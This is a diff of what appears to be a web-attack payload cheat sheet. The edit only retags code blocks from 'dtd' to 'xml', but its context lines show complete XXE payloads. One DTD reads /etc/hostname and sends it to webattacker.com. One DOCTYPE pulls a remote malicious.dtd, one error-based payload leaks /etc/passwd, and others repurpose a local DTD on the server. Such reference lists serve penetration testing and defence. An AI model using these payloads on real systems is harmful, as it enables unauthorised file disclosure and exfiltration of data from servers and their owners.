@@ -915,7 +915,7 @@ Some applications block input containing hostnames like `127.0.0.1` and localhos
   ```
 - **Exfiltrate data out-of-band**<br/>
   for-the-malicious-web-server.dtd
-  ```dtd
+  ```xml
   <!ENTITY % file SYSTEM "file:///etc/hostname">
   <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://webattacker.com/?x=%file;'>">
   %eval;
@@ -926,7 +926,7 @@ Some applications block input containing hostnames like `127.0.0.1` and localhos
   <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://webattacker.com/malicious.dtd"> %xxe;]>
   ```
 - **Exploiting blind XXE to retrieve data via error messages**
-  ```dtd
+  ```xml
   <!ENTITY % file SYSTEM "file:///etc/passwd">
   <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
   %eval;
@@ -934,7 +934,7 @@ Some applications block input containing hostnames like `127.0.0.1` and localhos
   ```
 - **Exploiting blind XXE by repurposing a local DTD**<br/>
   Suppose there is a DTD file on the server filesystem at the location `/usr/local/app/schema.dtd`
-  ```dtd
+  ```xml
   <!DOCTYPE foo [
   <!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
   <!ENTITY % custom_entity '
@@ -948,7 +948,7 @@ Some applications block input containing hostnames like `127.0.0.1` and localhos
   ]>
   ```
   To locate the DTD file, submit the payload
-  ```dtd
+  ```xml
   <!DOCTYPE foo [
   <!ENTITY % local_dtd SYSTEM
   "file:///usr/share/yelp/dtd/docbookx.dtd">
